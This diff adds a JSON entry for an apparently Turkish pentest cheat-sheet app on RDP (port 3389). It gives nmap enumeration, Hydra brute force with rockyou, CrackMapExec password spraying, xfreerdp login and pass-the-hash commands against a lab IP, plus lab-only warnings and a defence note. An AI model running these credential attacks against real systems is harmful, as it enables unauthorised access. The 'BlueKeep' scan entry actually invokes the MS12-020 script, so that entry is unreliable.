@@ -1,0 +1,69 @@
+{
+  "port": 3389,
+  "service": "RDP",
+  "protocol": "TCP",
+  "description": "Remote Desktop Protocol — Windows uzak masaüstü. Brute force, credential stuffing ve BlueKeep (CVE-2019-0708) gibi kritik zafiyetlere sahip.",
+  "risk": "critical",
+  "sections": [
+    {
+      "id": "enum",
+      "title": "RDP Enumeration",
+      "commands": [
+        {
+          "label": "Nmap RDP Script Taraması",
+          "command": "nmap -sV -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 192.168.1.105",
+          "description": "RDP şifreleme seviyesi ve MS12-020 DoS zafiyeti tespiti",
+          "output": "3389/tcp open ms-wbt-server\n| rdp-enum-encryption:\n|   Security layer:\n|     CredSSP: SUCCESS"
+        },
+        {
+          "label": "BlueKeep Zafiyet Taraması (CVE-2019-0708)",
+          "command": "nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.105",
+          "description": "BlueKeep ve MS12-020 zafiyetlerini kontrol et",
+          "warning": "BlueKeep istismarı hedef sistemi çöktürebilir. YALNIZCA lab ortamında."
+        }
+      ]
+    },
+    {
+      "id": "bruteforce",
+      "title": "RDP Brute Force",
+      "commands": [
+        {
+          "label": "Hydra RDP Brute Force",
+          "command": "hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.105 -t 4",
+          "description": "Senaryo: Windows Administrator hesabı için RDP brute force",
+          "output": "[3389][rdp] host: 192.168.1.105 login: Administrator password: Admin@123",
+          "warning": "RDP brute force çok yavaş ve gürültülüdür — IDS kolayca tespit eder."
+        },
+        {
+          "label": "CrackMapExec RDP Spraying",
+          "command": "crackmapexec rdp 192.168.1.0/24 -u admin -p password123",
+          "description": "Ağdaki tüm Windows sistemlere credential spraying"
+        }
+      ]
+    },
+    {
+      "id": "access",
+      "title": "RDP Bağlantısı",
+      "commands": [
+        {
+          "label": "xfreerdp ile RDP (Linux)",
+          "command": "xfreerdp /u:Administrator /p:Admin@123 /v:192.168.1.105 /cert:ignore",
+          "description": "Senaryo: Kali'den Windows RDP bağlantısı",
+          "flags": [
+            "/u:kullanici → kullanıcı adı",
+            "/p:parola → şifre",
+            "/v:ip:port → hedef",
+            "/cert:ignore → sertifika uyarısını atla",
+            "/drive:kali,/tmp → paylaşımlı klasör"
+          ]
+        },
+        {
+          "label": "Hash ile RDP (Pass the Hash)",
+          "command": "xfreerdp /u:Administrator /pth:'NTLM_HASH' /v:192.168.1.105",
+          "description": "Senaryo: NTLM hash ile parola gerekmeden RDP bağlantısı (Restricted Admin Mode gerekli)"
+        }
+      ]
+    }
+  ],
+  "defenseNote": "RDP güvenlik önlemleri: RDP'yi internete doğrudan açmayın — VPN arkasına alın. NLA (Network Level Authentication) zorunlu kılın. fail2ban veya Windows Account Lockout Policy ile brute force'u engelleyin. RDP portunu değiştirin (3389 yerine). Çift faktörlü kimlik doğrulama kullanın. BlueKeep için KB4499175 patch'ini uygulayın. RDP loglarını izleyin (Event ID 4624, 4625)."
+}
